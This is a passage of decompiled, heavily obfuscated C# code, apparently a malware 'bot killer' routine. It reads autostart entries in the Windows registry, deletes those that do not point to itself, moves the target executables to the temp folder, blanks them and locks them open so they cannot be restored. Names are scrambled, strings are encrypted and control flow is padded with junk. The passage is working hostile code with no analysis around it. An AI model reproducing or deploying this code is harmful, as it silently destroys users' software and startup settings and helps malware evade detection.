			if (int_0 == 2)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(string_0);
			}
			string[] valueNames = registryKey.GetValueNames();
			string[] array2 = default(string[]);
			foreach (string text in valueNames)
			{
				try
				{
					string text2 = registryKey.GetValue(text)!.ToString();
					if (text2.Contains(_003CModule_003E.____<string>(3688647296u)))
					{
						if (text2.Contains(_003CModule_003E._____<string>(1419880545u)))
						{
							text2.Replace(_003CModule_003E.___<string>(4017844528u), string.Empty);
						}
						try
						{
							string[] array = Strings.Split(text2, _003CModule_003E.______<string>(3865796739u), -1, (CompareMethod)0);
							text2 = array[0];
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					int num = _003CModule_003E._______________;
					if (-5832 != ((1820327936 * num == -2627) ? ((nint)Type.EmptyTypes.LongLength + -1287567016) : (-5833)))
					{
					}
					nint num2;
					if (text2.Contains(_003CModule_003E.___<string>(4017844528u)))
					{
						array2 = text2.Split(new char[1] { '"' });
						num2 = (nint)Type.EmptyTypes.LongLength + 0;
						goto IL_0124;
					}
					goto IL_0136;
					IL_0136:
					if (!text2.Contains(_____________________________________________________________________________.__))
					{
						num2 = sizeof(byte) + 0;
						goto IL_0124;
					}
					goto end_IL_004e;
					IL_0124:
					switch (num2)
					{
					default:
						text2 = array2[1];
						break;
					case 1:
						if (!text2.Contains(Application.get_ExecutablePath()))
						{
							_______________(int_0, text, string_0, text2);
							if (__________(text2))
							{
								__++;
								________________(text2);
							}
						}
						goto end_IL_004e;
					}
					goto IL_0136;
					end_IL_004e:;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void _______________(int int_0, string string_0, string string_1, string string_2)
	{
		try
		{
			RegistryKey registryKey = null;
			registryKey = ((int_0 != 1) ? Registry.LocalMachine.OpenSubKey(string_1, writable: true) : Registry.CurrentUser.OpenSubKey(string_1, writable: true));
			using (registryKey)
			{
				registryKey?.DeleteValue(string_0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void ________________(string string_0)
	{
		try
		{
			if (!File.Exists(string_0))
			{
				return;
			}
			Random random = new Random();
			try
			{
				if (___________________________________________________________________.________())
				{
					string string_ = Path.GetTempPath() + Conversions.ToString(random.Next(1000, 9000));
					MoveFileExA(ref string_0, ref string_, 4L);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				_____________________________________________________________________________._______________(string_0);
				((ServerComputer)global::_____________._).get_FileSystem().MoveFile(string_0, Path.GetTempPath() + Conversions.ToString(random.Next(1000, 9000)));
				File.WriteAllText(string_0, string.Empty);
				FileSystem.FileOpen(FileSystem.FreeFile(), string_0, (OpenMode)1, (OpenAccess)(-1), (OpenShare)0, -1);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				___________(string_0);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long MoveFileExA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, long long_0);
}
